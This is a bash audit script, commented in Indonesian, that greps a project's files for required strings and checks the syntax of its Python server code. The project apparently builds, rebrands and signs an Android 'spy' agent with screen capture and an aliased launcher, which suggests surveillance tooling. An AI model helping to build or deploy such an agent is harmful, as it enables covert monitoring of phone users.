#!/usr/bin/env bash
# Audit invarian kritis. Exit 1 bila ada yang gagal.
set -uo pipefail
R='\033[1;31m'; G='\033[1;32m'; N='\033[0m'
cd "$(dirname "$0")/.."
fail=0
chk(){ # chk "label" "pola" "file" [harus_kosong]
  local label="$1" pat="$2" file="$3" inv="${4:-}"
  local n; n=$(grep -c -- "$pat" "$file" 2>/dev/null || true)
  if [[ "$inv" == "kosong" ]]; then
    if [[ "$n" -eq 0 ]]; then echo -e "${G}[OK]${N} $label"; else echo -e "${R}[X]${N} $label ($n)"; fail=$((fail+1)); fi
  else
    if [[ "$n" -gt 0 ]]; then echo -e "${G}[OK]${N} $label"; else echo -e "${R}[X]${N} $label"; fail=$((fail+1)); fi
  fi
}

chk "branding tanpa app_name" "app_name" server/branding.py kosong
chk "branding pakai mzk_label" "mzk_label" server/branding.py
chk "branding pakai mzk_icon" "mzk_icon" server/branding.py
chk "injector param use_label" "use_label" server/injector.py
chk "injector authority app" "{app}{FILES_SUFFIX}" server/injector.py
chk "injector tanpa authority.files" "{authority}.files" server/injector.py kosong
chk "injector meta wizard" "mzk.wizard" server/injector.py
chk "builder teruskan flag" "has_label, has_icon" server/builder.py
chk "api_build name kosong" 'name: str = Form("")' server/api_build.py
chk "signer fallback v3" "v3-signing-enabled" server/signer.py
chk "MainActivity tanpa R" "R.string" agent/app/src/main/java/ai/m4zk1play/spy/MainActivity.java kosong
chk "Keys punya wizard" "mzk.wizard" agent/app/src/main/java/ai/m4zk1play/spy/Keys.java
chk "ScreenModule registerCallback" "registerCallback" agent/app/src/main/java/ai/m4zk1play/spy/ScreenModule.java
chk "AgentService upgradeFg" "upgradeFg" agent/app/src/main/java/ai/m4zk1play/spy/AgentService.java
chk "manifest alias Launcher" 'android:name=".Launcher"' agent/app/src/main/AndroidManifest.xml
chk "manifest MzkFiles" 'android:name=".MzkFiles"' agent/app/src/main/AndroidManifest.xml

python - <<'PY'
import ast, sys
bad = 0
for f in ["server/injector.py","server/builder.py","server/api_build.py",
          "server/branding.py","server/signer.py","server/main.py","server/ws.py"]:
    try: ast.parse(open(f).read())
    except SyntaxError as e:
        print(f"\033[1;31m[X]\033[0m syntax {f}: {e}"); bad += 1
if not bad: print("\033[1;32m[OK]\033[0m syntax semua server")
sys.exit(1 if bad else 0)
PY
[[ $? -ne 0 ]] && fail=$((fail+1))

[[ $fail -gt 0 ]] && { echo; echo -e "${R}$fail pemeriksaan gagal${N}"; exit 1; }
echo; echo -e "${G}Audit bersih.${N}"
